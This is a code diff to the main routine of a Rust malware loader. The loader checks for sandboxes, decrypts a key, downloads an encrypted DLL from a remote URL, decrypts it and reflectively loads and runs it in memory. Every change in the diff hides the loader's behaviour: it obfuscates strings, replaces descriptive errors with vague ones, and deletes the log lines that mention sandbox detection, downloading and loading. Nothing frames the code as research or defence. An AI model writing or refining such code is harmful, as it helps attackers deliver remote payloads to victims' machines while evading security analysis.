@@ -3,6 +3,7 @@ mod dll_fetch;
 mod pe_loader;
 
 use config::LoaderConfig;
+use obfstr::obfstr;
 use std::env;
 
 fn main() {
@@ -13,7 +14,7 @@ fn main() {
     let (injected, raw_json) = match parse_injected_config() {
         Some((cfg, json)) => (cfg, json),
         None => {
-            eprintln!("[!] No injected config found");
+            eprintln!("{}", obfstr!("[!] Configuration error"));
             std::process::exit(1);
         }
     };
@@ -25,7 +26,6 @@ fn main() {
 
     // 3. Anti-analysis check (skip uptime on boot to avoid self-kill on autostart)
     if is_sandbox(is_boot) {
-        eprintln!("[!] Sandbox detected. Exiting.");
         std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
         std::process::exit(0);
     }
@@ -33,77 +33,67 @@ fn main() {
     // 4. Decrypt AES key
     let aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
         Ok(k) => k,
-        Err(e) => {
-            eprintln!("[!] Failed to decrypt AES key: {}", e);
+        Err(_) => {
+            eprintln!("{}", obfstr!("[!] Initialization failed"));
             std::process::exit(1);
         }
     };
 
     // 5. Download and decrypt core DLL
     let download_url = loader_cfg.download_url();
-    eprintln!("[*] Downloading core from: {}", download_url);
 
     let rt = match tokio::runtime::Builder::new_current_thread()
         .enable_all()
         .build()
     {
         Ok(rt) => rt,
-        Err(e) => {
-            eprintln!("[!] Failed to create tokio runtime: {}", e);
+        Err(_) => {
+            eprintln!("{}", obfstr!("[!] Runtime error"));
             std::process::exit(1);
         }
     };
 
     let dll_bytes = match rt.block_on(dll_fetch::download_core(&download_url)) {
         Ok(encrypted) => {
-            eprintln!("[*] Downloaded {} bytes, decrypting...", encrypted.len());
             match dll_fetch::decrypt_dll(&encrypted, &aes_key) {
-                Ok(decrypted) => {
-                    eprintln!("[*] Core DLL decrypted: {} bytes", decrypted.len());
-                    decrypted
-                }
-                Err(e) => {
-                    eprintln!("[!] Failed to decrypt core DLL: {}", e);
+                Ok(decrypted) => decrypted,
+                Err(_) => {
+                    eprintln!("{}", obfstr!("[!] Decryption failed"));
                     std::process::exit(1);
                 }
             }
         }
-        Err(e) => {
-            eprintln!("[!] Failed to download core: {}", e);
+        Err(_) => {
+            eprintln!("{}", obfstr!("[!] Network error"));
             std::process::exit(1);
         }
     };
 
     // 6. Validate PE/ELF header
     if dll_bytes.len() < 2 {
-        eprintln!("[!] Core DLL too small");
         std::process::exit(1);
     }
 
     #[cfg(target_os = "windows")]
     if dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
-        eprintln!("[!] Core DLL is not a valid PE file");
         std::process::exit(1);
     }
 
     #[cfg(target_os = "linux")]
     if dll_bytes[0] != 0x7F || dll_bytes[1] != 0x45 {
-        eprintln!("[!] Core DLL is not a valid ELF file");
         std::process::exit(1);
     }
 
     // 7. Reflective load
-    eprintln!("[*] Reflective loading core DLL...");
     let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
         Ok(f) => f,
-        Err(e) => {
-            eprintln!("[!] Reflective load failed: {}", e);
+        Err(_) => {
+            eprintln!("{}", obfstr!("[!] Load failed"));
             std::process::exit(1);
         }
     };
 
-    // 8. Call core_main with config JSON
-    eprintln!("[*] Calling core_main...");
+    // 8. Call entry point with config JSON
     let config_bytes = loader_cfg.config_json.as_bytes();
     entry_fn(config_bytes.as_ptr(), config_bytes.len());
 
